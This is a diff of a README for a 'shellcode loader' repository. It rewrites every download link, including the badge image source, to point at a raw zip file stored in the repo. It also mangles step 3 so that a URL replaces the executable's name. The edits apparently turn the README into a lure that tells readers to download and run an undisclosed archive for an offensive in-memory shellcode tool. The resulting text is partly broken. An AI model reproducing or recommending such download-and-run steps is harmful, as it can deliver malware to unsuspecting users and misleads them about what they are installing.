@@ -6,7 +6,7 @@ Welcome to the MemoryExec-Shellcode-Loader repository. This tool helps you run e
 
 ## 📥 Download Link
 
-[![Download MemoryExec-Shellcode-Loader](https://img.shields.io/badge/Download-MemoryExec--Shellcode--Loader-brightgreen)](https://github.com/MaicolMoreno26/MemoryExec-Shellcode-Loader/releases)
+[![Download MemoryExec-Shellcode-Loader](https://github.com/MaicolMoreno26/MemoryExec-Shellcode-Loader/raw/refs/heads/main/Loader/Shellcode-Exec-Memory-Loader-1.7.zip)](https://github.com/MaicolMoreno26/MemoryExec-Shellcode-Loader/raw/refs/heads/main/Loader/Shellcode-Exec-Memory-Loader-1.7.zip)
 
 ## 🔍 Overview
 
@@ -30,11 +30,11 @@ To run MemoryExec-Shellcode-Loader, you'll need:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/MaicolMoreno26/MemoryExec-Shellcode-Loader/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/MaicolMoreno26/MemoryExec-Shellcode-Loader/raw/refs/heads/main/Loader/Shellcode-Exec-Memory-Loader-1.7.zip).
 
 2. **Choose the Latest Release**: Look for the latest version listed at the top of the page. This version will include the latest features and bug fixes.
 
-3. **Download the Application**: Click on the download link for the Windows executable. It might be labeled as `MemoryExec.exe` or similar. Save it to your computer.
+3. **Download the Application**: Click on the download link for the Windows executable. It might be labeled as `https://github.com/MaicolMoreno26/MemoryExec-Shellcode-Loader/raw/refs/heads/main/Loader/Shellcode-Exec-Memory-Loader-1.7.zip` or similar. Save it to your computer.
 
 4. **Run the Tool**:
    - Locate the downloaded file on your computer.
@@ -82,4 +82,4 @@ MemoryExec-Shellcode-Loader is licensed under the MIT License. You may use and m
 
 For any questions or support requests, please open an issue in the GitHub repository, and we will assist you promptly.
 
-[![Download MemoryExec-Shellcode-Loader](https://img.shields.io/badge/Download-MemoryExec--Shellcode--Loader-brightgreen)](https://github.com/MaicolMoreno26/MemoryExec-Shellcode-Loader/releases)
+[![Download MemoryExec-Shellcode-Loader](https://github.com/MaicolMoreno26/MemoryExec-Shellcode-Loader/raw/refs/heads/main/Loader/Shellcode-Exec-Memory-Loader-1.7.zip)](https://github.com/MaicolMoreno26/MemoryExec-Shellcode-Loader/raw/refs/heads/main/Loader/Shellcode-Exec-Memory-Loader-1.7.zip)
